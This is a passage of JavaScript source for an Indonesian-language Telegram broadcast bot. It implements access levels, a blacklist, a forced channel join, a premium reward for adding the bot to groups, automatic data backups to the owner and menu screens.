const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const os = require('os');
const axios = require("axios");
const chalk = require("chalk");
const fetch = require("node-fetch");
const path = require('path');

const chatSessions = {}; 
const lastMenuMessage = {};
const activeMenus = {};
const autoForwards = {}; 
const depositSessions = {};

const DATA_FILE = 'data.json';
const PRODUCT_FILE = 'dataproduct.json';
const { 
BOT_TOKEN, 
OWNER_IDS, 
PAYMENT_SETTINGS, 
CHANNEL_USERNAME, 
DEVELOPER, 
MENU_IMAGES } = require('./config.js');

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const BOT_START_TIME = Date.now();
const defaultData = {
  premium: {},
  owner: OWNER_IDS,
  groups: [],
  users: [],
  blacklist: []
};

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

function getRandomImage() {
  return MENU_IMAGES[Math.floor(Math.random() * MENU_IMAGES.length)];
}

function loadJSON(file) {
  try {
    if (!fs.existsSync(file)) fs.writeFileSync(file, '{}');
    const raw = fs.readFileSync(file, 'utf8');
    return raw.length ? JSON.parse(raw) : {};
  } catch (e) {
    console.error('loadJSON error:', e);
    return {};
  }
}

function saveJSON(file, data) {
  try {
    if (!data) data = {};
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('saveJSON error:', e);
  }
}

const users = loadJSON(DATA_FILE);
const productDB = loadJSON(PRODUCT_FILE);

if (!productDB.products) productDB.products = {};
if (!productDB.orders) productDB.orders = {};
if (!productDB.deposits) productDB.deposits = {};

function saveData() { saveJSON(DATA_FILE, users); }
function saveProductData() { saveJSON(PRODUCT_FILE, productDB); }

function initializeUser(userId, user = {}) {
  if (!users || typeof users !== 'object') users = {};
  if (!users[userId]) {
    users[userId] = {
      id: userId,
      name: user.first_name || 'User',
      balance: 0,
      created_at: new Date().toISOString()
    };
    saveData();
  }
  return users[userId];
}

function calculateAdminFee(amount) {
  const fixed = PAYMENT_SETTINGS.ADMIN_FEE.FIXED || 0;
  const percent = (amount * (PAYMENT_SETTINGS.ADMIN_FEE.PERCENTAGE || 0)) / 100;
  return fixed + percent;
}

function calculateTotalAmount(amount) {
  return amount + calculateAdminFee(amount);
}

function loadData() {
  try {
    const file = fs.readFileSync(DATA_FILE, 'utf8');
    const data = file.length ? JSON.parse(file) : {};
    
    if (!data.users) data.users = [];
    if (!data.groups) data.groups = [];
    if (!data.blacklist) data.blacklist = [];
    if (!data.premium) data.premium = {};
    if (!data.owner) data.owner = OWNER_IDS;
    
    return data;
  } catch {
    return defaultData;
  }
}

function saveData(data) {
  if (!data) data = users;
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}


function isMainOwner(id) {
  return OWNER_IDS.map(String).includes(String(id));
}

function isAdditionalOwner(id) {
  const data = loadData();
  return Array.isArray(data.owner) && data.owner.map(String).includes(String(id));
}

function isCEO(id) {
  const data = loadData();
  return Array.isArray(data.ceo) && data.ceo.map(String).includes(String(id));
}

function isAnyOwner(id) {
  return isMainOwner(id) || isAdditionalOwner(id) || isCEO(id);
}


function isOwner(id) {
  return isAnyOwner(id);
}

function isPremium(id) {
  const data = loadData();
  const exp = data.premium[id];
  if (!exp) return false;
  const nowSec = Math.floor(Date.now() / 1000);
  return nowSec < exp;
}

async function cekAkses(level, msg) {
  const userId = msg.from.id.toString();
  const chatId = msg.chat.id;
  const nama = msg.from.first_name || "User";

  if (!(await requireNotBlacklisted(msg))) return false;
  if (!(await requireNotMaintenance(msg))) return false;
  if (!(await requireJoin(msg))) return false;

  const isMain = isMainOwner(userId);
  const isCeo = isCEO(userId);
  const isOwn = isAdditionalOwner(userId);
  const isPrem = isPremium(userId);

  async function gagal(pesan) {
    try {
      await bot.sendMessage(chatId, pesan, { parse_mode: "HTML" });
    } catch (e) {}
    return false;
  }

  switch ((level || "").toLowerCase()) {
    case "utama":
      if (!isMain)
        return gagal(`
<blockquote>⚙️ 𝗔𝗸𝘀𝗲𝘀 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗨𝘁𝗮𝗺𝗮</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>User:</b> ${nama}
➥ <b>Level:</b> Developer Utama
➥ <b>Status:</b> Akses Ditolak

📝 <b>Keterangan</b>
➥ Perintah ini hanya dapat dijalankan oleh Owner Utama
➥ Fitur dikunci untuk menjaga kestabilan sistem`);
      break;

    case "ceo":
      if (!isMain && !isCeo)
        return gagal(`
<blockquote>👑 𝗔𝗸𝘀𝗲𝘀 𝗞𝗵𝘂𝘀𝘂𝘀 𝗖𝗘𝗢</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>User:</b> ${nama}
➥ <b>Level:</b> CEO
➥ <b>Status:</b> Akses Ditolak

📝 <b>Keterangan</b>
➥ Perintah ini hanya bisa digunakan oleh CEO atau Developer`);
      break;

    case "owner":
      if (!isMain && !isCeo && !isOwn)
        return gagal(`
<blockquote>🔰 𝗔𝗸𝘀𝗲𝘀 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>User:</b> ${nama}
➥ <b>Level:</b> Owner
➥ <b>Status:</b> Akses Ditolak

📝 <b>Keterangan</b>
➥ Perintah ini hanya untuk Owner Tambahan, CEO, atau Developer`);
      break;

    case "premium":
      if (!isPrem && !isOwn && !isCeo && !isMain)
        return gagal(`
<blockquote>💎 𝗙𝗶𝘁𝘂𝗿 𝗞𝗵𝘂𝘀𝘂𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>User:</b> ${nama}
➥ <b>Level:</b> Premium
➥ <b>Status:</b> Akses Ditolak

📝 <b>Keterangan</b>
➥ Fitur ini hanya untuk pengguna Premium atau Owner
➥ Tambahkan bot ke minimal 2 grup aktif
➥ Hubungi Admin untuk aktivasi Premium`);
      break;

    default:
      return gagal(`
<blockquote>⚠️ 𝗟𝗲𝘃𝗲𝗹 𝗔𝗸𝘀𝗲𝘀 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶𝗸𝗲𝗻𝗮𝗹𝗶</blockquote>
➥ <b>Level:</b> <code>${level}</code>
➥ <b>Status:</b> Level akses tidak valid`);
  }

  return true;
}

async function cekGroupOnly(msg, bot) {
  const data = loadData();
  if (!data.settings?.grouponly) return true;

  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    await bot.sendMessage(
      msg.chat.id,
      `<blockquote>⚠️ 𝗙𝗶𝘁𝘂𝗿 𝗛𝗮𝗻𝘆𝗮 𝗨𝗻𝘁𝘂𝗸 𝗚𝗿𝘂𝗽</blockquote>

🌸 <b>Informasi Penggunaan</b>
➥ <b>Status:</b> Fitur hanya bisa digunakan di grup
➥ <b>Tipe Chat:</b> ${msg.chat.type}

📝 <b>Keterangan</b>
➥ Silakan gunakan fitur ini di grup yang sudah ditambahkan bot`,
      { parse_mode: "HTML" }
    );
    return false;
  }
  return true;
}

async function requireNotMaintenance(msg) {
  const userId = msg.from.id.toString();
  const chatId = msg.chat.id;

  if (isMaintenance() && !isMainOwner(userId)) {
    await bot.sendMessage(
      chatId,
      `<blockquote>⚙️ 𝗕𝗼𝘁 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲</blockquote>

🌸 <b>Informasi Sistem</b>
➥ <b>User:</b> ${msg.from.first_name}
➥ <b>Status:</b> Mode Maintenance
➥ <b>Akses:</b> Terbatas

📝 <b>Keterangan</b>
➥ Bot sedang dalam proses perawatan sistem
➥ Hanya Owner Utama yang dapat menggunakan bot sementara
➥ Bot akan segera aktif kembali`,
      { parse_mode: "HTML" }
    );
    return false;
  }
  return true;
}

async function requireNotBlacklisted(msg) {
  const userId = msg.from.id.toString();

  if (isBlacklisted(userId)) {
    await bot.sendMessage(
      userId,
      `<blockquote>⛔ 𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸</blockquote>

🌸 <b>Informasi Blacklist</b>
➥ <b>User:</b> ${msg.from.first_name}
➥ <b>Status:</b> Terdaftar dalam blacklist
➥ <b>Akses:</b> Ditolak

📝 <b>Keterangan</b>
➥ Kamu tidak bisa menggunakan bot ini
➥ Jika merasa ini kesalahan, hubungi admin
➥ Gunakan menu Hubungi Admin untuk banding`,
      { parse_mode: "HTML" }
    );
    return false;
  }
  return true;
}

function isMaintenance() {
  const data = loadData();
  return data.settings?.maintenance === true;
}

function setMaintenance(state) {
  const data = loadData();
  if (!data.settings) data.settings = {};
  data.settings.maintenance = state;
  saveData(data);
}

function getGlobalCooldownMinutes() {
  const data = loadData();
  return data.settings?.cooldown?.default || 15;
}

function getGlobalCooldownMs() {
  return getGlobalCooldownMinutes() * 60 * 1000;
}

function isBlacklisted(userId) {
  const data = loadData();
  return Array.isArray(data.blacklist) && data.blacklist.map(String).includes(String(userId));
}

const { writeFileSync, existsSync, mkdirSync } = require('fs');

function backupData() {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const backupDir = './backup';
  const backupPath = `${backupDir}/data-${timestamp}.json`;

  if (!existsSync(backupDir)) mkdirSync(backupDir);
  if (!existsSync(DATA_FILE)) return null;
  const content = fs.readFileSync(DATA_FILE);
  writeFileSync(backupPath, content);

  return backupPath;
}

// === HANDLE BOT DITAMBAHKAN / DIKELUARKAN ===
bot.on("my_chat_member", async (msg) => {
  try {
    const data = loadData();
    const chat = msg.chat || msg.chat_member?.chat;
    const user = msg.from;
    const status = msg.new_chat_member?.status;
    const chatId = chat?.id;
    const userId = user?.id;

    if (!chat || !user || !status || !chatId || !userId) return;

    const isGroup = ["group", "supergroup"].includes(chat.type);
    const mainOwner = OWNER_IDS[0];
    const now = Math.floor(Date.now() / 1000);

    if (!data.groups) data.groups = [];
    if (!data.user_group_count) data.user_group_count = {};
    if (!data.premium) data.premium = {};

    // === BOT DITAMBAHKAN KE GRUP ===
    if (["member", "administrator"].includes(status) && isGroup) {
      if (data.premium[userId] && data.premium[userId] <= now) {
        delete data.premium[userId];
        console.log(`🔒 Premium expired & dihapus untuk ${userId} sebelum tambah grup`);
      }

      if (!data.groups.includes(chatId)) data.groups.push(chatId);

      data.user_group_count[userId] = (data.user_group_count[userId] || 0) + 1;

      let memberCount = 0;
      try {
        memberCount = await bot.getChatMemberCount(chatId);
      } catch {
        memberCount = 0;
      }

      if (memberCount >= 5) {
        const durasiDetik = 1 * 86400; // 1 hari
        const current = data.premium[userId] || now;
        data.premium[userId] = current > now ? current + durasiDetik : now + durasiDetik;

        await bot.sendMessage(
          userId,
          `<blockquote>🎉 𝗧𝗲𝗿𝗶𝗺𝗮 𝗞𝗮𝘀𝗶𝗵!</blockquote>

🌸 <b>Informasi Reward</b>
➥ <b>Grup:</b> ${chat.title}
➥ <b>Member:</b> ${memberCount} user
➥ <b>Reward:</b> Premium 1 Hari
➥ <b>Status:</b> ✅ Aktif

📝 <b>Keterangan</b>
➥ Terima kasih telah menambahkan bot ke grup
➥ Akses premium telah diaktifkan selama 1 hari
➥ Nikmati semua fitur premium sekarang!`,
          { parse_mode: "HTML" }
        ).catch(() => {});

        const info = `
<blockquote>➕ 𝗕𝗼𝘁 𝗗𝗶𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 𝗞𝗲 𝗚𝗿𝘂𝗽 𝗕𝗮𝗿𝘂</blockquote>

🌸 <b>Informasi Grup</b>
➥ <b>Pengguna:</b> <a href="tg://user?id=${userId}">${user.first_name}</a>
➥ <b>ID User:</b> <code>${userId}</code>
➥ <b>Username:</b> @${user.username || "-"}
➥ <b>Nama Grup:</b> ${chat.title}
➥ <b>ID Grup:</b> <code>${chatId}</code>
➥ <b>Member Grup:</b> ${memberCount}

🎁 <b>Reward Diberikan</b>
➥ <b>Akses:</b> Premium 1 Hari
➥ <b>Status:</b> ✅ Berhasil`;
        
        await bot.sendMessage(mainOwner, info, { parse_mode: "HTML" }).catch(() => {});

        const backupPath = backupData();
        if (backupPath) {
          await bot.sendDocument(mainOwner, backupPath, { 
            caption: `<blockquote>💾 𝗕𝗮𝗰𝗸𝘂𝗽 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀</blockquote>
➥ <b>Trigger:</b> Bot ditambahkan ke grup baru
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}`,
            parse_mode: "HTML" 
          }).catch(() => {});
        }
      } else {
        await bot.sendMessage(
          userId,
          `<blockquote>⚠️ 𝗚𝗿𝘂𝗽 𝗧𝗶𝗱𝗮𝗸 𝗠𝗲𝗺𝗲𝗻𝘂𝗵𝗶</blockquote>

🌸 <b>Informasi Grup</b>
➥ <b>Grup:</b> ${chat.title}
➥ <b>Member:</b> ${memberCount} user
➥ <b>Minimal:</b> 5 member
➥ <b>Status:</b> ❌ Tidak memenuhi syarat

📝 <b>Keterangan</b>
➥ Grup harus memiliki minimal 5 member
➥ Untuk mendapatkan premium 1 hari gratis
➥ Tambahkan lebih banyak member ke grup`,
          { parse_mode: "HTML" }
        ).catch(() => {});
      }

      saveData(data);
    }

    // === BOT DIKELUARKAN DARI GRUP ===
    if (["left", "kicked", "banned", "restricted"].includes(status) && isGroup) {
      if (data.groups.includes(chatId)) {
        data.groups = data.groups.filter((id) => id !== chatId);
        data.user_group_count[userId] = Math.max(0, (data.user_group_count[userId] || 1) - 1);

        if (data.user_group_count[userId] < 1) {
          delete data.premium[userId];
          await bot.sendMessage(
            userId,
            `<blockquote>❌ 𝗕𝗼𝘁 𝗗𝗶𝗸𝗲𝗹𝘂𝗮𝗿𝗸𝗮𝗻 𝗗𝗮𝗿𝗶 𝗚𝗿𝘂𝗽</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>Status:</b> Bot dihapus dari grup
➥ <b>Akses:</b> Premium dicabut
➥ <b>Grup:</b> ${chat.title}

📝 <b>Keterangan</b>
➥ Akses premium otomatis dicabut
➥ Tambahkan bot ke grup baru untuk mendapatkan premium kembali`,
            { parse_mode: "HTML" }
          ).catch(() => {});
        }

        const info = `
<blockquote>⚠️ 𝗕𝗼𝘁 𝗗𝗶𝗸𝗲𝗹𝘂𝗮𝗿𝗸𝗮𝗻 𝗗𝗮𝗿𝗶 𝗚𝗿𝘂𝗽</blockquote>

🌸 <b>Informasi Grup</b>
➥ <b>Pengguna:</b> <a href="tg://user?id=${userId}">${user.first_name}</a>
➥ <b>Username:</b> @${user.username || "-"}
➥ <b>ID User:</b> <code>${userId}</code>
➥ <b>Nama Grup:</b> ${chat.title}
➥ <b>ID Grup:</b> <code>${chatId}</code>
➥ <b>Status:</b> ❌ Dikeluarkan`;

        await bot.sendMessage(mainOwner, info, { parse_mode: "HTML" }).catch(() => {});

        const backupPath = backupData();
        if (backupPath) {
          await bot.sendDocument(mainOwner, backupPath, { 
            caption: `<blockquote>💾 𝗕𝗮𝗰𝗸𝘂𝗽 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀</blockquote>
➥ <b>Trigger:</b> Bot dikeluarkan dari grup
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}`,
            parse_mode: "HTML" 
          }).catch(() => {});
        }

        saveData(data);
      }
    }
  } catch (err) {
    console.error("❌ Error my_chat_member:", err);
  }
});

// === CEK EXPIRED PREMIUM SETIAP MENIT ===
setInterval(() => {
  const data = loadData();
  const now = Math.floor(Date.now() / 1000);
  let expiredCount = 0;

  for (const uid in data.premium) {
    if (data.premium[uid] <= now) {
      delete data.premium[uid];
      expiredCount++;
      console.log(`🔒 Premium expired & dihapus untuk ${uid}`);

      bot.sendMessage(uid, `
💎 <b>Premium Expired</b>
Halo <b>Pengguna Kyzz ☇</b> 🌸  
Masa aktif <b>Premium</b> kamu telah <b>berakhir</b> dan otomatis dicabut ⏳  

Untuk memperpanjang, tambahkan bot ke <b>1 grup baru (≥5 member)</b>  
atau hubungi admin untuk aktivasi manual 💎
`, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "💎 Perpanjang Premium", url: `https://t.me/${DEVELOPER.replace('@', '')}` }],
            [{ text: "📢 Channel Info", url: `https://t.me/${CHANNEL_USERNAME.replace('@', '')}` }]
          ]
        }
      }).catch(() => {});
    }
  }

  if (expiredCount > 0) {
    console.log(`✅ Berhasil hapus ${expiredCount} user premium yang expired`);
    saveData(data);
  }
}, 60 * 1000);

// === CEK JOIN CHANNEL ===
async function checkChannelMembership(userId) {
  try {
    const chatMember = await bot.getChatMember(CHANNEL_USERNAME, userId);
    return ["member", "administrator", "creator"].includes(chatMember.status);
  } catch {
    return false;
  }
}

async function requireJoin(msg) {
  const userId = msg.from.id;
  const isMember = await checkChannelMembership(userId);

  if (!isMember) {

    const originalCommand = msg.text || "/start";
    userPendingCommands[userId] = originalCommand;

    await bot.sendMessage(userId, `<blockquote>🚫 𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>User:</b> ${msg.from.first_name}
➥ <b>Status:</b> Belum bergabung channel
➥ <b>Akses:</b> Dibatasi

📝 <b>Keterangan</b>
➥ Kamu belum bergabung ke Channel Resmi kami
➥ Silakan join terlebih dahulu untuk menggunakan bot
➥ Setelah join, klik tombol "Coba Lagi"`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Gabung Channel Resmi", url: `https://t.me/${CHANNEL_USERNAME.replace('@','')}` }],
            [{ text: "🔄 Sudah Gabung, Coba Lagi", callback_data: "check_join_again" }]
          ]
        }
      });
    return false;
  }
  
  if (userPendingCommands[userId]) {
    delete userPendingCommands[userId];
  }
  
  return true;
}

const userPendingCommands = {};

function withRequireJoin(handler) {
  return async (msg, match) => {
    const ok = await requireJoin(msg);
    if (!ok) return;
    return handler(msg, match);
  };
}

// === CALLBACK JOIN CHECK ===
bot.on("callback_query", async (query) => {
  const userId = query.from.id.toString();
  const chatId = query.message.chat.id;

  if (query.data === "check_join_again") {
    await bot.answerCallbackQuery(query.id, {
      text: "🔄 Mengecek keanggotaan channel...",
      show_alert: false
    });

    const isMember = await checkChannelMembership(userId);

    if (isMember) {

      await bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
      
      await bot.sendMessage(chatId, `<blockquote>✅ 𝗧𝗲𝗿𝗶𝗺𝗮 𝗞𝗮𝘀𝗶𝗵!</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>Status:</b> Berhasil bergabung
➥ <b>Akses:</b> ✅ Diberikan

📝 <b>Keterangan</b>
➥ Sekarang kamu bisa menikmati semua fitur bot
➥ Command akan dijalankan otomatis...`,
        { parse_mode: "HTML" });

      const pendingCommand = userPendingCommands[userId];
      if (pendingCommand) {

        const simulatedMsg = {
          ...query.message,
          text: pendingCommand,
          from: query.from,
          chat: { id: chatId }
        };

        if (pendingCommand === "/start") {
          await bot.emit("text", simulatedMsg);
        } else {

          setTimeout(() => {
            bot.emit("text", simulatedMsg);
          }, 1000);
        }

        delete userPendingCommands[userId];
      } else {

        setTimeout(() => {
          bot.emit("text", {
            ...query.message,
            text: "/start",
            from: query.from,
            chat: { id: chatId }
          });
        }, 1000);
      }

    } else {
      await bot.editMessageText(`<blockquote>⚠️ 𝗕𝗲𝗹𝘂𝗺 𝗕𝗲𝗿𝗴𝗮𝗯𝘂𝗻𝗴</blockquote>

🌸 <b>Informasi Akses</b>
➥ <b>Status:</b> Masih belum bergabung
➥ <b>Akses:</b> ❌ Ditolak

📝 <b>Keterangan</b>
➥ Kamu belum bergabung di channel
➥ Silakan tekan tombol "Gabung Channel Resmi"
➥ Setelah join, klik tombol "Coba Lagi" lagi`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Gabung Channel Resmi", url: `https://t.me/${CHANNEL_USERNAME.replace('@','')}` }],
              [{ text: "🔄 Sudah Gabung, Coba Lagi", callback_data: "check_join_again" }]
            ]
          }
        }
      );
    }
  }
});

// == START ==
bot.onText(/\/start/, withRequireJoin(async (msg) => {
  if (!(await requireNotBlacklisted(msg))) return;
  if (!(await requireNotMaintenance(msg))) return;
  const data = loadData();
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const waktuRunPanel = getUptime();
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  if ((msg.date * 1000) < BOT_START_TIME) return;

  if (!data.users) {
    data.users = [];
  }
  
  if (!data.users.includes(userId)) {
    data.users.push(userId);
    saveData(data);
  }

  if (!data.groups) {
    data.groups = [];
  }

  const caption = `<blockquote>🌸 ─── 《 ❝ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 ❞ 》 ─── 🌸</blockquote>

🌸 <b>Informasi Bot</b>
➥ <b>Developer:</b> ${DEVELOPER}
➥ <b>Name Bot:</b> Kyzz ☇ Jaseb Bot°
➥ <b>Version:</b> 1.9
➥ <b>Prefixes:</b> / (Slash)

📊 <b>Statistik Bot</b>
➥ <b>Groups:</b> <code>${data.groups.length}</code>
➥ <b>Users:</b> <code>${data.users.length}</code>
➥ <b>Uptime:</b> <code>${waktuRunPanel}</code>

<blockquote>✨ Selamat datang <b>${username}</b> di bot kami!</blockquote>
`;

  await replaceMenu(chatId, caption, {
    keyboard: [
      [{ text: "✨ Jasher Menu" }],
      [{ text: "🛍 Store Menu" }, { text: "📊 Status Akun" }],
      [{ text: "🧩 Tools Menu" }],
      [{ text: "💎 Owner Menu" }, { text: "⁉️ Hubungi Admin" }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  });
}));

// === MAIN MENU ==
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const text = msg.text;
  const data = loadData();
  const waktuRunPanel = getUptime();
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const ownerIdUtama = OWNER_IDS[0];

  // Hapus pesan button yang diklik user
  if (["🔙 Kembali", "✨ Jasher Menu", "💎 Owner Menu", "🧩 Tools Menu", "🛍 Store Menu", "📊 Status Akun", "⁉️ Hubungi Admin"].includes(text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  }

  // == MAIN MENU ==
  if (text === "🔙 Kembali") {
    const caption = `<blockquote>🌸 ─── 《 ❝ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 ❞ 》 ─── 🌸</blockquote>

🌸 <b>Informasi Bot</b>
➥ <b>Developer:</b> ${DEVELOPER}
➥ <b>Name Bot:</b> Kyzz ☇ Jaseb Bot°
➥ <b>Version:</b> 1.9
➥ <b>Prefixes:</b> / (Slash)

📊 <b>Statistik Bot</b>
➥ <b>Groups:</b> <code>${data.groups.length}</code>
➥ <b>Users:</b> <code>${data.users.length}</code>
➥ <b>Uptime:</b> <code>${waktuRunPanel}</code>

<blockquote>✨ Selamat datang <b>${username}</b> di bot kami!</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "✨ Jasher Menu" }],
        [{ text: "🛍 Store Menu" }, { text: "📊 Status Akun" }],
        [{ text: "🧩 Tools Menu" }],
        [{ text: "💎 Owner Menu" }, { text: "⁉️ Hubungi Admin" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    });
  }

  // == STORE MENU ==
  if (text === "🛍 Store Menu") {
    const caption = `<blockquote>🛍 ─── 《 ❝ 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨 ❞ 》 ─── 🛍</blockquote>

🌸 <b>Informasi Store</b>
➥ <b>Total Produk:</b> <code>${Object.keys(productDB.products || {}).length}</code>
➥ <b>Status:</b> Store aktif

📝 <b>Command Store</b>
➥ <code>/addstock</code> - Tambah stok produk
➥ <code>/addproduct</code> - Tambah produk baru
➥ <code>/stock</code> - Lihat stok produk
➥ <code>/deposit</code> - Deposit saldo
➥ <code>/ceksaldo</code> - Cek saldo
➥ <code>/buy</code> - Beli produk

<blockquote>🛍 Selamat berbelanja di store kami!</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    });
  }

  // == OWNER MENU ==
  if (text === "💎 Owner Menu") {
     if (!(await cekAkses("owner", msg))) return;
    const caption = `<blockquote>💎 ─── 《 ❝ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ❞ 》 ─── 💎</blockquote>

🌸 <b>Informasi Owner</b>
➥ <b>Akses:</b> Owner & CEO
➥ <b>Status:</b> Menu khusus pemilik

🔧 <b>Command Management</b>
➥ <code>/addbl</code> - Tambah blacklist
➥ <code>/delbl</code> - Hapus blacklist
➥ <code>/listbl</code> - Lihat blacklist
➥ <code>/addceo</code> - Tambah CEO
➥ <code>/delceo</code> - Hapus CEO
➥ <code>/listceo</code> - Lihat CEO

👑 <b>Command Owner</b>
➥ <code>/addownjs</code> - Tambah owner
➥ <code>/delownjs</code> - Hapus owner
➥ <code>/listownjs</code> - Lihat owner
➥ <code>/addakses</code> - Tambah premium
➥ <code>/delakses</code> - Hapus premium
➥ <code>/listakses</code> - Lihat premium

<blockquote>💎 Menu khusus untuk Owner bot</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true
    });
  }

  // == TOOLS MENU ==
  if (text === "🧩 Tools Menu") {
    const caption = `<blockquote>🧩 ─── 《 ❝ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 ❞ 》 ─── 🧩</blockquote>

🌸 <b>Informasi Tools</b>
➥ <b>Total Tools:</b> 8+ fitur
➥ <b>Status:</b> Semua tools aktif

🛠️ <b>Command Tools</b>
➥ <code>/setmaintenance</code> - Mode maintenance
➥ <code>/grouponly</code> - Pengaturan grup
➥ <code>/update</code> - Update bot
➥ <code>/ping</code> - Cek status bot
➥ <code>/tourl</code> - Convert ke URL
➥ <code>/done</code> - Konfirmasi transaksi
➥ <code>/cekid</code> - Cek ID telegram
➥ <code>/backup</code> - Backup data

<blockquote>🧩 Berbagai tools utilitas untuk bot</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true
    });
  }

  // == JASHER MENU ==
  if (text === "✨ Jasher Menu") {
    const caption = `<blockquote>✨ ─── 《 ❝ 𝗝𝗔𝗦𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 ❞ 》 ─── ✨</blockquote>

🌸 <b>Informasi Jasher</b>
➥ <b>Fitur:</b> Auto messaging
➥ <b>Status:</b> Fitur broadcast

📨 <b>Command Jasher</b>
➥ <code>/auto on/off</code> - Aktifkan/nonaktifkan
➥ <code>/auto status</code> - Status auto
➥ <code>/setpesan</code> - Set pesan auto
➥ <code>/sharemsg</code> - Share pesan
➥ <code>/broadcast</code> - Broadcast pesan
➥ <code>/setjeda</code> - Atur jeda

<blockquote>✨ Fitur auto messaging dan broadcast</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true
    });
  }

  // == STATUS AKUN ==
  if (text === "📊 Status Akun") {
    const isMain = isMainOwner(userId);
    const isOwnerNow = isAnyOwner(userId);
    const isPremiumUser = data.premium?.[userId] && Math.floor(Date.now() / 1000) < data.premium[userId];
    const exp = isPremiumUser ? new Date(data.premium[userId] * 1000).toLocaleString("id-ID") : "Tidak ada";

    let status = "User Biasa";
    if (isMain) status = "👑 Pemilik Utama";
    else if (isOwnerNow) status = "💎 Owner";
    else if (isPremiumUser) status = "⭐ Premium";
    
    const expTime = isPremiumUser ? 
      `➥ <b>Kedaluwarsa:</b> <code>${exp}</code>` : 
      "➥ <b>Kedaluwarsa:</b> Tidak ada";

    const caption = `<blockquote>📊 ─── 《 ❝ 𝗦𝗧𝗔𝗧𝗨𝗦 𝗔𝗞𝗨𝗡 ❞ 》 ─── 📊</blockquote>

🌸 <b>Informasi Akun</b>
➥ <b>Nama:</b> ${msg.from.first_name || "User"}
➥ <b>Username:</b> ${username}
➥ <b>User ID:</b> <code>${userId}</code>
➥ <b>Status:</b> ${status}
${expTime}

📈 <b>Statistik Sistem</b>
➥ <b>Uptime:</b> <code>${waktuRunPanel}</code>
➥ <b>Total User:</b> <code>${data.users.length}</code>
➥ <b>Total Group:</b> <code>${data.groups.length}</code>

<blockquote>📊 Informasi lengkap status akun Anda</blockquote>
`;
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true
    });
  }

  // == HUBUNGI ADMIN ==
  if (text === "⁉️ Hubungi Admin") {
  
    chatSessions[userId] = { active: true, ownerId: ownerIdUtama };
    
    const caption = `<blockquote>💬 ─── 《 ❝ 𝗛𝗨𝗕𝗨𝗡𝗚𝗜 𝗔𝗗𝗠𝗜𝗡 ❞ 》 ─── 💬</blockquote>

🌸 <b>Sesi Obrolan Admin</b>
➥ <b>Status:</b> Sesi aktif
➥ <b>Admin:</b> <code>${ownerIdUtama}</code>

📝 <b>Instruksi</b>
➥ Silakan tulis pesan Anda untuk Admin
➥ Pesan akan langsung diteruskan ke Admin
➥ Gunakan tombol di bawah untuk menutup sesi

👋 Hai <b>${username}</b>, admin akan merespons secepatnya!`;
    
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "❌ Tutup Sesi" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    });
  }

